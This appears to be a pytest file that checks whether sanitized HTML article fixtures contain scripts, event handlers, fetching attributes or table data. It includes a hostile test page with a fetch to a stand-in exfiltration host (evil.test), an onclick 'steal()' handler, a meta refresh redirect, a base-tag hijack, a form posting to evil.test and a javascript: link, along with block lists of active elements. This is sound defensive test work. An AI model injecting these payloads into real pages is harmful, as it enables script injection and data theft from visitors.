"""A fixture is a page's SHAPE, and it must be safe to open and safe to publish.

Two findings, both about the boundary between a real capture and a committed
file. F-07: the generator removed selected elements and rewrote selected `img`
fields, so `on*` handlers and live `srcset` values reached bytes published under
an MIT licence and shipped in the sdist. F-08: the reducer shortens direct text,
so a table full of two-word cells passed every word-count check with its values
intact -- which is fine for the open-access page that happens to be committed
and not fine for the next input.

Both are asserted on the COMMITTED BYTES, not on the generator's intent, and
then again by running the generator over a page built to be hostile.
"""

from __future__ import annotations

import re
import subprocess
import sys
from pathlib import Path

import pytest
from corpus_capture.figure_manifest import parse_markup

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = sorted((ROOT / "fixtures").rglob("*.html"))
PLACEHOLDER = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"

#: Anything that runs, fetches, or navigates when the file is opened.
ACTIVE_ELEMENTS = [
    "script", "noscript", "iframe", "frame", "object", "embed", "applet",
    "base", "link", "style", "svg", "math", "canvas", "audio", "video",
    "source", "track", "form", "input", "button", "select", "textarea",
]
#: Attributes that name something to fetch, or something to run.
FETCHING_ATTRIBUTES = ["srcset", "sizes", "data-src", "poster", "background", "action"]


def test_there_are_fixtures_to_check():
    assert FIXTURES, "the scan would otherwise pass by being empty"


@pytest.fixture(params=FIXTURES, ids=lambda path: path.name)
def fixture(request):
    return request.param


class TestNothingInAFixtureRuns:
    def test_no_active_element_survives(self, fixture: Path):
        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        found = sorted({node.name for node in soup.find_all(ACTIVE_ELEMENTS)})
        assert not found, found

    def test_no_event_handler_attribute_survives(self, fixture: Path):
        """The exact bytes the audit found: `onclick` in the committed NEJM fixture."""

        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        found = [
            f"{node.name}[{name}]"
            for node in soup.find_all(True)
            for name in node.attrs
            if name.lower().startswith("on")
        ]
        assert not found, found

    def test_no_attribute_names_something_to_fetch(self, fixture: Path):
        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        found = [
            f"{node.name}[{name}]"
            for node in soup.find_all(True)
            for name in node.attrs
            if name.lower() in FETCHING_ATTRIBUTES
        ]
        assert not found, found

    def test_every_image_is_the_inert_placeholder(self, fixture: Path):
        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        for image in soup.find_all("img"):
            assert image.get("src") == PLACEHOLDER, image.get("src")

    def test_no_meta_navigates_or_sets_policy(self, fixture: Path):
        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        assert not soup.find_all("meta", attrs={"http-equiv": True})

    @pytest.mark.parametrize("scheme", ["javascript:", "vbscript:", "data:text/html"])
    def test_no_executable_url_scheme_appears(self, fixture: Path, scheme: str):
        assert scheme not in fixture.read_text(encoding="utf-8").lower()


class TestNoTablePayloadSurvives:
    """F-08. A table IS its cell values; the word-count check cannot see that."""

    def test_every_table_is_a_placeholder(self, fixture: Path):
        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        for table in soup.find_all("table"):
            assert table.get("data-fixture") == "table-omitted"
            cells = table.find_all(["td", "th"])
            assert len(cells) == 1, f"{len(cells)} cells survived"
            assert "omitted" in cells[0].get_text()

    def test_the_caption_survives_because_the_figure_manifest_reads_it(self, fixture: Path):
        """Structure is the point: a table's caption is what names it `Table 1`."""

        soup = parse_markup(fixture.read_text(encoding="utf-8"))
        for table in soup.find_all("table", attrs={"data-fixture": "table-omitted"}):
            caption = table.find("caption")
            if caption is not None:
                assert len(caption.get_text().split()) <= 25


HOSTILE = """<!doctype html>
<html><head>
  <meta charset="utf-8">
  <meta name="citation_doi" content="10.1000/hostile">
  <meta http-equiv="refresh" content="0;url=https://evil.test/">
  <base href="https://evil.test/">
  <link rel="stylesheet" href="https://evil.test/x.css">
  <script>fetch("https://evil.test/exfil")</script>
</head><body><main>
  <p onclick="steal()" style="background:url(https://evil.test/p.png)">%s</p>
  <form action="https://evil.test/post"><input name="a"><button>go</button></form>
  <figure id="f1"><picture><source srcset="https://evil.test/f1.jpg 2x">
    <img src="https://evil.test/f1.jpg" srcset="https://evil.test/f1@2x.jpg" alt="Figure1">
  </picture><figcaption>Figure 1. A caption.</figcaption></figure>
  <svg><use href="https://evil.test/x.svg#a"/></svg>
  <table><caption>Table 1. Laboratory data.</caption>
    <tr><th>Sodium</th><td>139 mmol/L</td></tr>
    <tr><th>Creatinine</th><td>8.4 mg/dL</td></tr></table>
  <a href="javascript:alert(1)">click</a>
</main></body></html>
""" % ("word " * 200)


def test_the_generator_makes_a_hostile_page_inert(tmp_path: Path):
    """The committed bytes are one input. This is the next one."""

    source = tmp_path / "hostile.html"
    source.write_text(HOSTILE, encoding="utf-8")
    out = tmp_path / "out.html"
    result = subprocess.run(
        [sys.executable, str(ROOT / "tools" / "make_capture_fixture.py"),
         "--profile", "generic", "--source", str(source),
         "--url", "https://example.org/article/1", "--out", str(out)],
        capture_output=True, text=True, check=False,
    )
    assert result.returncode == 0, result.stderr

    body = out.read_text(encoding="utf-8")
    assert "evil.test" not in body, "a live external reference survived"
    assert "javascript:" not in body
    assert "onclick" not in body
    soup = parse_markup(body)
    assert not soup.find_all(ACTIVE_ELEMENTS)
    assert not soup.find_all("meta", attrs={"http-equiv": True})
    # What a fixture is FOR still survives: the figure, its caption, the
    # identity metadata, and the table's caption.
    assert soup.find("figure", id="f1") is not None
    # The caption survives as far as the reducer takes it: first sentence, which
    # is what the figure manifest reads the label out of.
    assert soup.find("figcaption") is not None
    assert "Figure 1." in body
    assert soup.find("meta", attrs={"name": "citation_doi"}) is not None
    assert "Table 1." in body, "the table keeps the caption that names it"
    # And the table's values do not.
    assert "139 mmol/L" not in body and "8.4 mg/dL" not in body


def test_the_reducer_still_cuts_prose_to_one_sentence(tmp_path: Path):
    """The F-07/F-08 sanitizer must not have displaced the reason the tool exists."""

    source = tmp_path / "long.html"
    sentences = " ".join(f"Sentence number {n} runs on for a while." for n in range(40))
    source.write_text(
        f"<html><body><main><div>{sentences}</div></main></body></html>", encoding="utf-8"
    )
    out = tmp_path / "out.html"
    subprocess.run(
        [sys.executable, str(ROOT / "tools" / "make_capture_fixture.py"),
         "--profile", "generic", "--source", str(source),
         "--url", "https://example.org/a", "--out", str(out)],
        check=True, capture_output=True, text=True,
    )
    text = re.sub(r"\s+", " ", parse_markup(out.read_text(encoding="utf-8")).get_text(" "))
    assert "Sentence number 0" in text
    assert "Sentence number 5" not in text
